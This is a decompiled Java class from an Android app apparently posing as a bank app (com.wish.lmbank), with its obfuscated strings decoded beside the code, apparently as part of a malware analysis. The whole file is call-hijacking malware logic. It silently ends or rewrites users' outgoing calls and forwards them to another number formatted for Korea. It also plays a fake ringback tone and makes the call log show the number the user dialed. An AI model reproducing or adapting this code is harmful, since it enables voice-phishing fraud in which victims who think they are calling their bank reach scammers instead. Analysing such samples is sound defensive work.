//
// Decompiled by Jadx - 605ms
//
package com.wish.lmbank.receiver;

import android.content.Context;
import android.telephony.PhoneNumberUtils;
import android.text.TextUtils;
import com.wish.lmbank.AppStartV;
import com.wish.lmbank.bean.CallLogBean;
import com.wish.lmbank.phone.PhoneCallService;
import com.wish.lmbank.utils.LogUtils;
import com.wish.lmbank.utils.SettingUtils;
import com.wish.lmbank.utils.SharedPreferencesUtils;

class TelePhoneReceiver1 implements Runnable {
    final TelePhoneReceiver this$0;
    final Context val$context;
    final StringBuilder val$info;
    final boolean val$isAllowFloat;
    final boolean val$isDefaultDialer;

    TelePhoneReceiver1(TelePhoneReceiver telePhoneReceiver, boolean z, boolean z2, Context context, StringBuilder sb) {
        this.this$0 = telePhoneReceiver;
        this.val$isDefaultDialer = z;
        this.val$isAllowFloat = z2;
        this.val$context = context;
        this.val$info = sb;
    }

    @Override
    public void run() {
        if (!this.val$isDefaultDialer && this.val$isAllowFloat) {
            if (SettingUtils.endCall(this.val$context)) {
                StringBuilder sb = this.val$info;
//-^-                 sb.append(bb7d7pu7.m5998("RUmP5euP_8SO_dyBxvRFSY_iwY_g-o793IHG9FNJ") + TelePhoneReceiver.access$000(this.this$0) + bb7d7pu7.m5998("RUkAGjkFCBAqBgUGGzsABw5TSR0bHAxFSQoIBQU6DBsfAAoMU0k") + PhoneCallService.callService);
                sb.append(", 挂断电话, 拨打电话: " + TelePhoneReceiver.access$000(this.this$0) + ", isPlayColorRing: true, callService: " + PhoneCallService.callService);
                LogUtils.callLog(this.val$info.toString());
//-^-                 SharedPreferencesUtils.putValue(bb7d7pu7.m5998("IiwwNiA6Ni8mOz4oOy0gJy42ISgnLTY8OQ"), true);
                SharedPreferencesUtils.putValue("KEY_IS_FORWARDING_HAND_UP", true);
//-^-                 SharedPreferencesUtils.putValue(bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OiEmPjY5ISYnLA"), TelePhoneReceiver.access$100(this.this$0));
                SharedPreferencesUtils.putValue("KEY_FORWARDING_SHOW_PHONE", TelePhoneReceiver.access$100(this.this$0));
//-^-                 SharedPreferencesUtils.putValue(bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OSEmJyw"), TelePhoneReceiver.access$000(this.this$0));
                SharedPreferencesUtils.putValue("KEY_FORWARDING_PHONE", TelePhoneReceiver.access$000(this.this$0));
                AppStartV.isPlayColorRing = true;
                new TelePhoneReceiver.ColorRingThread(TelePhoneReceiver.access$100(this.this$0)).start();
                return;
            }
//-^-             TelePhoneReceiver.mCallLogBean = new CallLogBean(TelePhoneReceiver.access$100(this.this$0), TelePhoneReceiver.access$000(this.this$0), bb7d7pu7.m5998("DwYbHggbDQAHDg"), System.currentTimeMillis());
            TelePhoneReceiver.mCallLogBean = new CallLogBean(TelePhoneReceiver.access$100(this.this$0), TelePhoneReceiver.access$000(this.this$0), "forwarding", System.currentTimeMillis());
            StringBuilder sb2 = this.val$info;
//-^-             sb2.append(bb7d7pu7.m5998("RUmP5euP_8SBxvSMzdiB3cxFSQoIBQUlBg42U0k") + TelePhoneReceiver.mCallLogBean.toString() + bb7d7pu7.m5998("RUkaDB07DBocBR0tCB0IRUkaCB8MDSccBAsMGzsMCAVTSQ") + TelePhoneReceiver.access$000(this.this$0));
            sb2.append(", 挂断话失败, callLog_: " + TelePhoneReceiver.mCallLogBean.toString() + ", setResultData, savedNumberReal: " + TelePhoneReceiver.access$000(this.this$0));
//-^-             String formatNumber = PhoneNumberUtils.formatNumber(TelePhoneReceiver.access$000(this.this$0), bb7d7pu7.m5998("Ijs"));
            String formatNumber = PhoneNumberUtils.formatNumber(TelePhoneReceiver.access$000(this.this$0), "KR");
            if (!TextUtils.isEmpty(formatNumber)) {
                TelePhoneReceiver.access$002(this.this$0, formatNumber);
                StringBuilder sb3 = this.val$info;
//-^-                 sb3.append(bb7d7pu7.m5998("RUkaDB07DBocBR0tCB0IRUkZAQYHDC8GGwQIHVNJ") + TelePhoneReceiver.access$000(this.this$0));
                sb3.append(", setResultData, phoneFormat: " + TelePhoneReceiver.access$000(this.this$0));
            }
//-^-             TelePhoneReceiver.access$200(this.this$0).onOutgoingCallStarted(TelePhoneReceiver.access$100(this.this$0), TelePhoneReceiver.access$100(this.this$0), bb7d7pu7.m5998("BwYbBAgF"), TelePhoneReceiver.callStartTime);
            TelePhoneReceiver.access$200(this.this$0).onOutgoingCallStarted(TelePhoneReceiver.access$100(this.this$0), TelePhoneReceiver.access$100(this.this$0), "normal", TelePhoneReceiver.callStartTime);
            LogUtils.callLog(this.val$info.toString());
            TelePhoneReceiver telePhoneReceiver = this.this$0;
            telePhoneReceiver.setResultData(TelePhoneReceiver.access$000(telePhoneReceiver));
            return;
        }
        StringBuilder sb4 = this.val$info;
//-^-         sb4.append(bb7d7pu7.m5998("RUkAGjscBwcABw5TSQ") + PhoneCallService.isRunning);
        sb4.append(", isRunning: " + PhoneCallService.isRunning);
        if (this.val$isDefaultDialer && !PhoneCallService.isRunning) {
            StringBuilder sb5 = this.val$info;
//-^-             sb5.append(bb7d7pu7.m5998("RUmM-NWM5sKB1MWOztJTSQ") + TelePhoneReceiver.access$000(this.this$0));
            sb5.append(", 呼叫转移: " + TelePhoneReceiver.access$000(this.this$0));
            AppStartV.setAutoService(true, TelePhoneReceiver.access$100(this.this$0), TelePhoneReceiver.access$000(this.this$0));
//-^-             TelePhoneReceiver.mCallLogBean = new CallLogBean(TelePhoneReceiver.access$100(this.this$0), TelePhoneReceiver.access$000(this.this$0), bb7d7pu7.m5998("DwYbHggbDQAHDg"), System.currentTimeMillis());
            TelePhoneReceiver.mCallLogBean = new CallLogBean(TelePhoneReceiver.access$100(this.this$0), TelePhoneReceiver.access$000(this.this$0), "forwarding", System.currentTimeMillis());
//-^-             TelePhoneReceiver.access$200(this.this$0).onOutgoingCallStarted(TelePhoneReceiver.access$100(this.this$0), TelePhoneReceiver.access$000(this.this$0), bb7d7pu7.m5998("DwYbHggbDQAHDg"), TelePhoneReceiver.callStartTime);
            TelePhoneReceiver.access$200(this.this$0).onOutgoingCallStarted(TelePhoneReceiver.access$100(this.this$0), TelePhoneReceiver.access$000(this.this$0), "forwarding", TelePhoneReceiver.callStartTime);
        }
        LogUtils.callLog(this.val$info.toString());
    }
}
